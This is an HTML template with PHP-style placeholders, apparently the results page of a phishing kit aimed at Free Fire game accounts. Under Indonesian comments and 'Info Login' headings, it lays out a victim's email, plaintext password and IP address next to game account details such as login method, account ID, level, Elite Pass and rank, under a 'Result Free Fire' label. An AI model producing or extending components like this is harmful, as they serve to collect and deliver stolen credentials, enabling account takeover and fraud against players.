<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Info Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to right, #2c3e50, #3498db); /* Gradient biru */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            width: 90%;
            max-width: 600px;
        }

        .header {
            background-color: #3498db; /* Warna biru yang lebih terang */
            color: #fff;
            padding: 20px;
            text-align: center;
            border-radius: 10px 10px 0 0;
        }

        .header h1 {
            margin: 0;
            font-weight: 400;
        }

        .content {
            padding: 20px;
            background-color: #f9f9f9; /* Warna latar belakang konten */
            text-align: center; /* Posisikan teks ke tengah */
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd; /* Warna garis pemisah */
        }

        th {
            background-color: #3498db; /* Warna biru yang lebih terang */
            color: #fff;
            text-transform: uppercase;
            text-align: center; /* Posisikan teks ke tengah */
        }

        tr:last-child td {
            border-bottom: none;
        }

        .fa-icon {
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Info Login</h1>
        </div>
        <div class="content">
            <table>
                <tr>
                    <th colspan="2">Info Login</th>
                </tr>
                <tr>
                    <td><i class="fas fa-envelope fa-icon"></i>Email</td>
                    <td>$user</td>
                </tr>
                <tr>
                    <td><i class="fas fa-lock fa-icon"></i>Password</td>
                    <td>$pass</td>
                </tr>
                <tr>
                    <td><i class="fas fa-globe fa-icon"></i>IP Address</td>
                    <td>$ip</td>
                </tr>
                <tr>
                    <th colspan="2">Informasi Akun</th>
                </tr>
                <tr>
                    <td><i class="fas fa-sign-in-alt fa-icon"></i>Login</td>
                    <td>$login</td>
                </tr>
                <tr>
                    <td><i class="fas fa-user fa-icon"></i>Nickname</td>
                    <td>$nick</td>
                </tr>
                <tr>
                    <td><i class="fas fa-id-card fa-icon"></i>ID Akun</td>
                    <td>$playid</td>
                </tr>
                <tr>
                    <td><i class="fas fa-level-up-alt fa-icon"></i>Level Akun</td>
                    <td>$level</td>
                </tr>
                <tr>
                    <td><i class="fas fa-crown fa-icon"></i>Elite Pass</td>
                    <td>$epass</td>
                </tr>
                <tr>
                    <td><i class="fas fa-medal fa-icon"></i>Rank/Pangkat</td>
                    <td>$tier</td>
                </tr>
                <tr>
                    <th colspan="2">Result Free Fire</th>
                </tr>
            </table>
        </div>
    </div>
</body>
</html>
